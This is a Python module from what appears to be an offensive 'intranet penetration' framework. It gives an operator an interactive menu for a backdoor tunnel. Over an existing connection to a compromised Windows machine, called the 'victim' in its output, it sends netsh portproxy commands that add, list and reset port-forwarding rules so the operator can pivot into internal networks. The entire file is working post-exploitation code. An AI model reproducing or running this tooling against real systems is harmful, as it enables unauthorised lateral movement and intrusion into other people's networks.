import struct
from prompt_toolkit import prompt
from prompt_toolkit.completion import WordCompleter
from prompt_toolkit.formatted_text import ANSI
from prompt_toolkit.history import InMemoryHistory
import os
import sys

sys.path.append(os.path.dirname(os.path.realpath(__file__)))
from AuxiliaryFunctions import MyTable


# 利用Netsh进行端口转发
def Netsh(conn):
    commands = ["back", "show params", "show functions"]
    completer = WordCompleter(commands)
    formatted_text1 = ANSI('\033[1;32;32m(QingLong Framework/Intranet Penetration)-\033[0m\033[1;31;31m[BackDoor/Tunnel/2] \033[0m')
    history = InMemoryHistory()
    while True:
        try:
            choice = prompt(formatted_text1, completer=completer, history=history)
            if choice == 'show params':
                show_params()
                continue
            elif choice == "show functions":
                show_functions()
                continue
            elif choice == 'back':
                break
            elif choice == "":
                continue
            elif choice.split()[0] == '1':
                print('\033[1;32;32m' + "[+] Setting Port forwarding......" + '\033[0m')
                Set_Port_Forwarding = "netsh interface portproxy add v4tov4 listenport=" + choice.split()[1] + " connectport=" + choice.split()[2] + " connectaddress=" + choice.split()[3] + " && echo \"{}\" > 1.txt && type 1.txt && DEL 1.txt && exit".format('\033[1;34;34m' + "[+] Finished!" + '\033[0m')
                print('\033[1;32;32m' + "[+] victim's ip:{} => {}:{}.".format(choice.split()[1], choice.split()[3], choice.split()[2]) + '\033[0m')
                receive(conn, Set_Port_Forwarding)
                continue
            elif choice == '2':
                print('\033[1;32;32m' + "[+] Viewing all Port forwarding rules......" + '\033[0m')
                show_command = "netsh interface portproxy show all && echo \"{}\" > 1.txt && type 1.txt && DEL 1.txt && exit".format('\033[1;34;34m' + "[+] Finished!" + '\033[0m')
                receive(conn, show_command)
                continue
            elif choice == '3':
                print('\033[1;32;32m' + "[+] Clearing all Port forwarding rules......" + '\033[0m')
                delete_command = "netsh interface portproxy reset && echo \"{}\" > 1.txt && type 1.txt && DEL 1.txt && exit".format('\033[1;34;34m' + "[+] Finished!" + '\033[0m')
                receive(conn, delete_command)
                continue
            else:
                continue
        except:
            continue


def show_params():
    print("\n" + '\033[1;34;34m' + "Parameter Description" + '\033[0m' + "\n" + '=' * len("Parameter Description") + "\n")
    headers = ['\033[1;34;34m' "Params" + '\033[0m', '\033[1;34;34m' "Description" + '\033[0m']
    mydata = [["listen_port", "监听端口"], ["connect_port", "连接端口"], ["target_ip", "目标IP"]]
    MyTable.createTable(headers, mydata)


def show_functions():
    print("\n" + '\033[1;34;34m' + "Tunnel" + '\033[0m' + "\n" + '=' * len("Tunnel") + "\n")
    headers = ['\033[1;34;34m' + "id" + '\033[0m', '\033[1;34;34m' + "model" + '\033[0m', '\033[1;34;34m' + "usage" + '\033[0m', '\033[1;34;34m' + "description" + '\033[0m']
    mydata = [["1", "Set Port Forwarding", "1 listen_port connect_port target_ip", "设置端口转发"],
              ["2", "View all port forwarding rules", "2", "查看所有的端口转发规则"],
              ["3", "Clear all port forwarding rules", "3", "清除所有的端口转发规则"]]
    MyTable.createTable(headers, mydata)


def receive(conn, command):
    conn.sendall(command.encode("gbk"))
    result_len = conn.recv(4)
    real_len = struct.unpack("i", result_len)[0]
    while True:
        if 1024 < real_len:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            real_len = real_len - 1024
            continue
        else:
            result = conn.recv(1024).decode("gbk", errors="ignore")
            print(result)
            break
